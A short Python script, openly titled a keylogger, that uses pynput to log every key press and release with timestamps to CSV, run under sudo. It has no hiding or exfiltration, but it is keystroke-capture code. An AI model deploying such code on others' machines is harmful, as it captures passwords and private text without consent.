# how to run: sudo python keylogger.py > file_name.csv
# end it with a CTRL-C

from pynput.keyboard import Key, Listener
import time
import csv

PRESS = "press"
RELEASE = "release"

def on_press(key):
    log(key, PRESS)

def on_release(key):
    log(key, RELEASE)

def log(value, log_type):
    print('{0},{1},{2}'.format(value, time.time(), log_type))

# Collect events until released

with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()